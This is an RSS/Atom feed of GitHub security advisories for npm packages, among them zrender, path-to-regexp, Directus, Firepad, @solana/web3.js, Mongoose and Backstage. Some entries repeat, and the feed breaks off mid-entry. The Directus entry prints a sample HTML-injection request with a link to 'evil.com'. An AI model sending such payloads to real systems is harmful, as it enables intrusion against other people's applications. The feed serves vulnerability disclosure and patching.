<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-12-07T06:01:39.223Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[zrender] Prototype Pollution in the merge and clone helper methods]]></title>
        <id>https://github.com/advisories/GHSA-fhv8-fx5f-7fxf</id>
        <link href="https://github.com/advisories/GHSA-fhv8-fx5f-7fxf"/>
        <updated>2024-12-06T18:20:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Using <code>merge</code> and <code>clone</code> helper methods in the <code>src/core/util.ts</code> module will have prototype pollution. It will affect the popular data visualization library Apache ECharts, which is using and exported these two methods directly.</p>
<h3 id="patches">Patches</h3>
<p>It has been patched in <a href="https://github.com/ecomfe/zrender/pull/826">https://github.com/ecomfe/zrender/pull/826</a>. 
Users should update zrender to <code>5.2.1</code>.  and update echarts to <code>5.2.1</code> if project is using echarts.</p>
<h3 id="references">References</h3>
<p>NA</p>
<h3 id="for-more-information">For more information</h3>
<p>NA</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ecomfe/zrender/security/advisories/GHSA-fhv8-fx5f-7fxf">https://github.com/ecomfe/zrender/security/advisories/GHSA-fhv8-fx5f-7fxf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-39227">https://nvd.nist.gov/vuln/detail/CVE-2021-39227</a></li>
<li><a href="https://github.com/ecomfe/zrender/pull/826">https://github.com/ecomfe/zrender/pull/826</a></li>
<li><a href="https://github.com/ecomfe/zrender/releases/tag/5.2.1">https://github.com/ecomfe/zrender/releases/tag/5.2.1</a></li>
<li><a href="https://github.com/advisories/GHSA-fhv8-fx5f-7fxf">https://github.com/advisories/GHSA-fhv8-fx5f-7fxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhv8-fx5f-7fxf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-09-20T19:53:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zrender] Prototype Pollution in the merge and clone helper methods]]></title>
        <id>https://github.com/advisories/GHSA-fhv8-fx5f-7fxf</id>
        <link href="https://github.com/advisories/GHSA-fhv8-fx5f-7fxf"/>
        <updated>2024-12-06T18:20:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Using <code>merge</code> and <code>clone</code> helper methods in the <code>src/core/util.ts</code> module will have prototype pollution. It will affect the popular data visualization library Apache ECharts, which is using and exported these two methods directly.</p>
<h3 id="patches">Patches</h3>
<p>It has been patched in <a href="https://github.com/ecomfe/zrender/pull/826">https://github.com/ecomfe/zrender/pull/826</a>. 
Users should update zrender to <code>5.2.1</code>.  and update echarts to <code>5.2.1</code> if project is using echarts.</p>
<h3 id="references">References</h3>
<p>NA</p>
<h3 id="for-more-information">For more information</h3>
<p>NA</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ecomfe/zrender/security/advisories/GHSA-fhv8-fx5f-7fxf">https://github.com/ecomfe/zrender/security/advisories/GHSA-fhv8-fx5f-7fxf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-39227">https://nvd.nist.gov/vuln/detail/CVE-2021-39227</a></li>
<li><a href="https://github.com/ecomfe/zrender/pull/826">https://github.com/ecomfe/zrender/pull/826</a></li>
<li><a href="https://github.com/ecomfe/zrender/releases/tag/5.2.1">https://github.com/ecomfe/zrender/releases/tag/5.2.1</a></li>
<li><a href="https://github.com/advisories/GHSA-fhv8-fx5f-7fxf">https://github.com/advisories/GHSA-fhv8-fx5f-7fxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fhv8-fx5f-7fxf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-09-20T19:53:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[path-to-regexp] Unpatched `path-to-regexp` ReDoS in 0.1.x]]></title>
        <id>https://github.com/advisories/GHSA-rhx6-c78j-4q9w</id>
        <link href="https://github.com/advisories/GHSA-rhx6-c78j-4q9w"/>
        <updated>2024-12-06T00:33:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The regular expression that is vulnerable to backtracking can be generated in the 0.1.x release of <code>path-to-regexp</code>, originally reported in CVE-2024-45296</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to 0.1.12.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Avoid using two parameters within a single path segment, when the separator is not <code>.</code> (e.g. no <code>/:a-:b</code>). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/advisories/GHSA-9wv6-86v2-598j">https://github.com/advisories/GHSA-9wv6-86v2-598j</a></li>
<li><a href="https://blakeembrey.com/posts/2024-09-web-redos/">https://blakeembrey.com/posts/2024-09-web-redos/</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-rhx6-c78j-4q9w">https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-rhx6-c78j-4q9w</a></li>
<li><a href="https://blakeembrey.com/posts/2024-09-web-redos">https://blakeembrey.com/posts/2024-09-web-redos</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-52798">https://nvd.nist.gov/vuln/detail/CVE-2024-52798</a></li>
<li><a href="https://github.com/pillarjs/path-to-regexp/commit/f01c26a013b1889f0c217c643964513acf17f6a4">https://github.com/pillarjs/path-to-regexp/commit/f01c26a013b1889f0c217c643964513acf17f6a4</a></li>
<li><a href="https://github.com/advisories/GHSA-rhx6-c78j-4q9w">https://github.com/advisories/GHSA-rhx6-c78j-4q9w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rhx6-c78j-4q9w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-05T22:40:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus has an HTML Injection in Comment]]></title>
        <id>https://github.com/advisories/GHSA-r6wx-627v-gh2f</id>
        <link href="https://github.com/advisories/GHSA-r6wx-627v-gh2f"/>
        <updated>2024-12-05T22:37:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Comment feature has implemented a filter to prevent users from adding restricted characters, such as HTML tags. However, this filter operates on the client-side, which can be bypassed, making the application vulnerable to HTML Injection.</p>
<h3 id="details">Details</h3>
<p>The Comment feature implements a character filter on the client-side, this can be bypassed by directly sending a request to the endpoint.</p>
<p>Example Request:</p>
<pre><code>PATCH /activity/comment/3 HTTP/2
Host: directus.local

{
  "comment": "&lt;h1&gt;TEST &lt;p style=\"color:red\"&gt;HTML INJECTION&lt;/p&gt; &lt;a href=\"//evil.com\"&gt;Test Link&lt;/a&gt;&lt;/h1&gt;"
}
</code></pre>
<p>Example Response:</p>
<pre><code class="language-json">{
  "data": {
    "id": 3,
    "action": "comment",
    "user": "288fdccc-399a-40a1-ac63-811bf62e6a18",
    "timestamp": "2023-09-06T02:23:40.740Z",
    "ip": "10.42.0.1",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "collection": "directus_files",
    "item": "7247dda1-c386-4e7a-8121-7e9c1a42c15a",
    "comment": "&lt;h1&gt;TEST &lt;p style=\"color:red\"&gt;HTML INJECTION&lt;/p&gt; &lt;a href=\"//evil.com\"&gt;Test Link&lt;/a&gt;&lt;/h1&gt;",
    "origin": "https://directus.local",
    "revisions": []
  }
}
</code></pre>
<p>Example Result:</p>
<p><img alt="Screenshot 2023-09-06 094536" src="https://user-images.githubusercontent.com/61263002/265876100-12e068fe-3d53-41b4-bfcb-458c2bc2a638.png"></p>
<h2 id="impact">Impact</h2>
<p>With the introduction of session cookies this issue has become exploitable as a malicious script is now able to do authenticated actions on the current users behalf.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-r6wx-627v-gh2f">https://github.com/directus/directus/security/advisories/GHSA-r6wx-627v-gh2f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-54128">https://nvd.nist.gov/vuln/detail/CVE-2024-54128</a></li>
<li><a href="https://github.com/directus/directus/commit/4487fb18d5cb09e071b111d2dc0c9d6bcb437633">https://github.com/directus/directus/commit/4487fb18d5cb09e071b111d2dc0c9d6bcb437633</a></li>
<li><a href="https://github.com/directus/directus/commit/c89dbb233fbad2fd0cf41eb99d50c6de4e84195d">https://github.com/directus/directus/commit/c89dbb233fbad2fd0cf41eb99d50c6de4e84195d</a></li>
<li><a href="https://github.com/advisories/GHSA-r6wx-627v-gh2f">https://github.com/advisories/GHSA-r6wx-627v-gh2f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r6wx-627v-gh2f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-05T22:37:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus has an HTML Injection in Comment]]></title>
        <id>https://github.com/advisories/GHSA-r6wx-627v-gh2f</id>
        <link href="https://github.com/advisories/GHSA-r6wx-627v-gh2f"/>
        <updated>2024-12-05T22:37:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Comment feature has implemented a filter to prevent users from adding restricted characters, such as HTML tags. However, this filter operates on the client-side, which can be bypassed, making the application vulnerable to HTML Injection.</p>
<h3 id="details">Details</h3>
<p>The Comment feature implements a character filter on the client-side, this can be bypassed by directly sending a request to the endpoint.</p>
<p>Example Request:</p>
<pre><code>PATCH /activity/comment/3 HTTP/2
Host: directus.local

{
  "comment": "&lt;h1&gt;TEST &lt;p style=\"color:red\"&gt;HTML INJECTION&lt;/p&gt; &lt;a href=\"//evil.com\"&gt;Test Link&lt;/a&gt;&lt;/h1&gt;"
}
</code></pre>
<p>Example Response:</p>
<pre><code class="language-json">{
  "data": {
    "id": 3,
    "action": "comment",
    "user": "288fdccc-399a-40a1-ac63-811bf62e6a18",
    "timestamp": "2023-09-06T02:23:40.740Z",
    "ip": "10.42.0.1",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "collection": "directus_files",
    "item": "7247dda1-c386-4e7a-8121-7e9c1a42c15a",
    "comment": "&lt;h1&gt;TEST &lt;p style=\"color:red\"&gt;HTML INJECTION&lt;/p&gt; &lt;a href=\"//evil.com\"&gt;Test Link&lt;/a&gt;&lt;/h1&gt;",
    "origin": "https://directus.local",
    "revisions": []
  }
}
</code></pre>
<p>Example Result:</p>
<p><img alt="Screenshot 2023-09-06 094536" src="https://user-images.githubusercontent.com/61263002/265876100-12e068fe-3d53-41b4-bfcb-458c2bc2a638.png"></p>
<h2 id="impact">Impact</h2>
<p>With the introduction of session cookies this issue has become exploitable as a malicious script is now able to do authenticated actions on the current users behalf.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-r6wx-627v-gh2f">https://github.com/directus/directus/security/advisories/GHSA-r6wx-627v-gh2f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-54128">https://nvd.nist.gov/vuln/detail/CVE-2024-54128</a></li>
<li><a href="https://github.com/directus/directus/commit/4487fb18d5cb09e071b111d2dc0c9d6bcb437633">https://github.com/directus/directus/commit/4487fb18d5cb09e071b111d2dc0c9d6bcb437633</a></li>
<li><a href="https://github.com/directus/directus/commit/c89dbb233fbad2fd0cf41eb99d50c6de4e84195d">https://github.com/directus/directus/commit/c89dbb233fbad2fd0cf41eb99d50c6de4e84195d</a></li>
<li><a href="https://github.com/advisories/GHSA-r6wx-627v-gh2f">https://github.com/advisories/GHSA-r6wx-627v-gh2f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r6wx-627v-gh2f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-05T22:37:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@directus/app] Directus has an HTML Injection in Comment]]></title>
        <id>https://github.com/advisories/GHSA-r6wx-627v-gh2f</id>
        <link href="https://github.com/advisories/GHSA-r6wx-627v-gh2f"/>
        <updated>2024-12-05T22:37:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Comment feature has implemented a filter to prevent users from adding restricted characters, such as HTML tags. However, this filter operates on the client-side, which can be bypassed, making the application vulnerable to HTML Injection.</p>
<h3 id="details">Details</h3>
<p>The Comment feature implements a character filter on the client-side, this can be bypassed by directly sending a request to the endpoint.</p>
<p>Example Request:</p>
<pre><code>PATCH /activity/comment/3 HTTP/2
Host: directus.local

{
  "comment": "&lt;h1&gt;TEST &lt;p style=\"color:red\"&gt;HTML INJECTION&lt;/p&gt; &lt;a href=\"//evil.com\"&gt;Test Link&lt;/a&gt;&lt;/h1&gt;"
}
</code></pre>
<p>Example Response:</p>
<pre><code class="language-json">{
  "data": {
    "id": 3,
    "action": "comment",
    "user": "288fdccc-399a-40a1-ac63-811bf62e6a18",
    "timestamp": "2023-09-06T02:23:40.740Z",
    "ip": "10.42.0.1",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "collection": "directus_files",
    "item": "7247dda1-c386-4e7a-8121-7e9c1a42c15a",
    "comment": "&lt;h1&gt;TEST &lt;p style=\"color:red\"&gt;HTML INJECTION&lt;/p&gt; &lt;a href=\"//evil.com\"&gt;Test Link&lt;/a&gt;&lt;/h1&gt;",
    "origin": "https://directus.local",
    "revisions": []
  }
}
</code></pre>
<p>Example Result:</p>
<p><img alt="Screenshot 2023-09-06 094536" src="https://user-images.githubusercontent.com/61263002/265876100-12e068fe-3d53-41b4-bfcb-458c2bc2a638.png"></p>
<h2 id="impact">Impact</h2>
<p>With the introduction of session cookies this issue has become exploitable as a malicious script is now able to do authenticated actions on the current users behalf.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-r6wx-627v-gh2f">https://github.com/directus/directus/security/advisories/GHSA-r6wx-627v-gh2f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-54128">https://nvd.nist.gov/vuln/detail/CVE-2024-54128</a></li>
<li><a href="https://github.com/directus/directus/commit/4487fb18d5cb09e071b111d2dc0c9d6bcb437633">https://github.com/directus/directus/commit/4487fb18d5cb09e071b111d2dc0c9d6bcb437633</a></li>
<li><a href="https://github.com/directus/directus/commit/c89dbb233fbad2fd0cf41eb99d50c6de4e84195d">https://github.com/directus/directus/commit/c89dbb233fbad2fd0cf41eb99d50c6de4e84195d</a></li>
<li><a href="https://github.com/advisories/GHSA-r6wx-627v-gh2f">https://github.com/advisories/GHSA-r6wx-627v-gh2f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r6wx-627v-gh2f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-05T22:37:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[firepad] Firepad allows insecure document access]]></title>
        <id>https://github.com/advisories/GHSA-4fh7-m2wx-6wfm</id>
        <link href="https://github.com/advisories/GHSA-4fh7-m2wx-6wfm"/>
        <updated>2024-12-05T19:06:22.000Z</updated>
        <content type="html"><![CDATA[<p>Firepad through 1.5.11 allows remote attackers, who have knowledge of a pad ID, to retrieve both the current text of a document and all content that has previously been pasted into the document. NOTE: in several similar products, this is the intentional behavior for anyone who knows the full document ID and corresponding URL. NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-51210">https://nvd.nist.gov/vuln/detail/CVE-2024-51210</a></li>
<li><a href="https://firebase.blog/posts/2013/04/announcing-firepad-our-open-source">https://firebase.blog/posts/2013/04/announcing-firepad-our-open-source</a></li>
<li><a href="https://github.com/FirebaseExtended/firepad/releases/tag/v1.5.11">https://github.com/FirebaseExtended/firepad/releases/tag/v1.5.11</a></li>
<li><a href="https://medium.com/@adityaahuja.work/accessing-full-history-of-firepad-users-ddc889e73936">https://medium.com/@adityaahuja.work/accessing-full-history-of-firepad-users-ddc889e73936</a></li>
<li><a href="https://github.com/advisories/GHSA-4fh7-m2wx-6wfm">https://github.com/advisories/GHSA-4fh7-m2wx-6wfm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4fh7-m2wx-6wfm</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-12-04T21:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@solana/web3.js] Modified package published to npm, containing malware that exfiltrates private key material]]></title>
        <id>https://github.com/advisories/GHSA-jcxm-7wvp-g6p5</id>
        <link href="https://github.com/advisories/GHSA-jcxm-7wvp-g6p5"/>
        <updated>2024-12-04T19:56:50.000Z</updated>
        <content type="html"><![CDATA[<p>Earlier today, a publish-access account was compromised for <code>@solana/web3.js</code>, a JavaScript library that is commonly used by Solana dapps. This allowed an attacker to publish unauthorized and malicious packages that were modified, allowing them to steal private key material and drain funds from dapps, like bots, that handle private keys directly. This issue should not affect non-custodial wallets, as they generally do not expose private keys during transactions. This is not an issue with the Solana protocol itself, but with a specific JavaScript client library and only appears to affect projects that directly handle private keys and that updated within the window of 3:20pm UTC and 8:25pm UTC on Tuesday, December 3, 2024.</p>
<p>These two unauthorized versions (1.95.6 and 1.95.7) were caught within hours and have since been unpublished.</p>
<p>We are asking all Solana app developers to upgrade to version 1.95.8. Developers pinned to <code>latest</code> should also upgrade to 1.95.8.</p>
<p>Developers that suspect they might be compromised should rotate any suspect authority keys, including multisigs, program authorities, server keypairs, and so on.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/solana-labs/solana-web3.js/security/advisories/GHSA-jcxm-7wvp-g6p5">https://github.com/solana-labs/solana-web3.js/security/advisories/GHSA-jcxm-7wvp-g6p5</a></li>
<li><a href="https://github.com/advisories/GHSA-2mhj-xmf4-pr8m">https://github.com/advisories/GHSA-2mhj-xmf4-pr8m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-54134">https://nvd.nist.gov/vuln/detail/CVE-2024-54134</a></li>
<li><a href="https://github.com/advisories/GHSA-jcxm-7wvp-g6p5">https://github.com/advisories/GHSA-jcxm-7wvp-g6p5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jcxm-7wvp-g6p5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-04T18:09:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mongoose] Mongoose search injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-m7xq-9374-9rvx</id>
        <link href="https://github.com/advisories/GHSA-m7xq-9374-9rvx"/>
        <updated>2024-12-04T16:41:02.000Z</updated>
        <content type="html"><![CDATA[<p>Mongoose versions prior to 8.8.3, 7.8.3, and 6.13.5 are vulnerable to improper use of the $where operator. This vulnerability arises from the ability of the $where clause to execute arbitrary JavaScript code in MongoDB queries, potentially leading to code injection attacks and unauthorized access or manipulation of database data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53900">https://nvd.nist.gov/vuln/detail/CVE-2024-53900</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/c9e86bff7eef477da75a29af62a06d41a835a156">https://github.com/Automattic/mongoose/commit/c9e86bff7eef477da75a29af62a06d41a835a156</a></li>
<li><a href="https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md">https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md</a></li>
<li><a href="https://github.com/Automattic/mongoose/releases">https://github.com/Automattic/mongoose/releases</a></li>
<li><a href="https://www.npmjs.com/package/mongoose?activeTab=versions">https://www.npmjs.com/package/mongoose?activeTab=versions</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/33679bcf8ca43d74e3e8ecd4cc224826772d805b">https://github.com/Automattic/mongoose/commit/33679bcf8ca43d74e3e8ecd4cc224826772d805b</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/6.13.4...6.13.5">https://github.com/Automattic/mongoose/compare/6.13.4...6.13.5</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/7.8.2...7.8.3">https://github.com/Automattic/mongoose/compare/7.8.2...7.8.3</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/8.8.2...8.8.3">https://github.com/Automattic/mongoose/compare/8.8.2...8.8.3</a></li>
<li><a href="https://github.com/advisories/GHSA-m7xq-9374-9rvx">https://github.com/advisories/GHSA-m7xq-9374-9rvx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m7xq-9374-9rvx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-02T21:31:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mongoose] Mongoose search injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-m7xq-9374-9rvx</id>
        <link href="https://github.com/advisories/GHSA-m7xq-9374-9rvx"/>
        <updated>2024-12-04T16:41:02.000Z</updated>
        <content type="html"><![CDATA[<p>Mongoose versions prior to 8.8.3, 7.8.3, and 6.13.5 are vulnerable to improper use of the $where operator. This vulnerability arises from the ability of the $where clause to execute arbitrary JavaScript code in MongoDB queries, potentially leading to code injection attacks and unauthorized access or manipulation of database data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53900">https://nvd.nist.gov/vuln/detail/CVE-2024-53900</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/c9e86bff7eef477da75a29af62a06d41a835a156">https://github.com/Automattic/mongoose/commit/c9e86bff7eef477da75a29af62a06d41a835a156</a></li>
<li><a href="https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md">https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md</a></li>
<li><a href="https://github.com/Automattic/mongoose/releases">https://github.com/Automattic/mongoose/releases</a></li>
<li><a href="https://www.npmjs.com/package/mongoose?activeTab=versions">https://www.npmjs.com/package/mongoose?activeTab=versions</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/33679bcf8ca43d74e3e8ecd4cc224826772d805b">https://github.com/Automattic/mongoose/commit/33679bcf8ca43d74e3e8ecd4cc224826772d805b</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/6.13.4...6.13.5">https://github.com/Automattic/mongoose/compare/6.13.4...6.13.5</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/7.8.2...7.8.3">https://github.com/Automattic/mongoose/compare/7.8.2...7.8.3</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/8.8.2...8.8.3">https://github.com/Automattic/mongoose/compare/8.8.2...8.8.3</a></li>
<li><a href="https://github.com/advisories/GHSA-m7xq-9374-9rvx">https://github.com/advisories/GHSA-m7xq-9374-9rvx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m7xq-9374-9rvx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-02T21:31:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mongoose] Mongoose search injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-m7xq-9374-9rvx</id>
        <link href="https://github.com/advisories/GHSA-m7xq-9374-9rvx"/>
        <updated>2024-12-04T16:41:02.000Z</updated>
        <content type="html"><![CDATA[<p>Mongoose versions prior to 8.8.3, 7.8.3, and 6.13.5 are vulnerable to improper use of the $where operator. This vulnerability arises from the ability of the $where clause to execute arbitrary JavaScript code in MongoDB queries, potentially leading to code injection attacks and unauthorized access or manipulation of database data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53900">https://nvd.nist.gov/vuln/detail/CVE-2024-53900</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/c9e86bff7eef477da75a29af62a06d41a835a156">https://github.com/Automattic/mongoose/commit/c9e86bff7eef477da75a29af62a06d41a835a156</a></li>
<li><a href="https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md">https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md</a></li>
<li><a href="https://github.com/Automattic/mongoose/releases">https://github.com/Automattic/mongoose/releases</a></li>
<li><a href="https://www.npmjs.com/package/mongoose?activeTab=versions">https://www.npmjs.com/package/mongoose?activeTab=versions</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/33679bcf8ca43d74e3e8ecd4cc224826772d805b">https://github.com/Automattic/mongoose/commit/33679bcf8ca43d74e3e8ecd4cc224826772d805b</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/6.13.4...6.13.5">https://github.com/Automattic/mongoose/compare/6.13.4...6.13.5</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/7.8.2...7.8.3">https://github.com/Automattic/mongoose/compare/7.8.2...7.8.3</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/8.8.2...8.8.3">https://github.com/Automattic/mongoose/compare/8.8.2...8.8.3</a></li>
<li><a href="https://github.com/advisories/GHSA-m7xq-9374-9rvx">https://github.com/advisories/GHSA-m7xq-9374-9rvx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m7xq-9374-9rvx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-02T21:31:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@backstage/plugin-scaffolder-node] Backstage Scaffolder plugin vulnerable to Server-Side Request Forgery]]></title>
        <id>https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</id>
        <link href="https://github.com/advisories/GHSA-qmc2-jpr5-7rg9"/>
        <updated>2024-12-02T21:36:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A vulnerability is identified in Backstage Scaffolder template functionality where Server-Side Template Injection (SSTI) can be exploited to perform Git config injection. The vulnerability allows an attacker to capture privileged git tokens used by the Backstage Scaffolder plugin. With these tokens, unauthorized access to sensitive resources in git can be achieved. The impact is considered medium severity as the Backstage Threat Model recommends restricting access to adding and editing templates in the Backstage Catalog plugin.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been resolved in versions <code>v0.4.12</code>, <code>v0.5.1</code> and <code>v0.6.1</code> of the <code>@backstage/plugin-scaffolder-node</code> package. Users are encouraged to upgrade to this version to mitigate the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users can ensure that templates do not change git config.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in the <a href="https://github.com/backstage/backstage">Backstage repository</a>
Visit our Discord, linked to in <a href="https://github.com/backstage/backstage">Backstage README</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/backstage/backstage/security/advisories/GHSA-qmc2-jpr5-7rg9">https://github.com/backstage/backstage/security/advisories/GHSA-qmc2-jpr5-7rg9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53983">https://nvd.nist.gov/vuln/detail/CVE-2024-53983</a></li>
<li><a href="https://github.com/backstage/backstage/tree/master/plugins/scaffolder-node">https://github.com/backstage/backstage/tree/master/plugins/scaffolder-node</a></li>
<li><a href="https://github.com/advisories/GHSA-qmc2-jpr5-7rg9">https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-02T21:36:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@backstage/plugin-scaffolder-node] Backstage Scaffolder plugin vulnerable to Server-Side Request Forgery]]></title>
        <id>https://github.com/advisories/GHSA-qmc2-jpr5-7rg9</id>
        <link href="https://github.com/advisories/GHSA-qmc2-jpr5-7rg9"/>
        <updated>2024-12-02T21:36:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
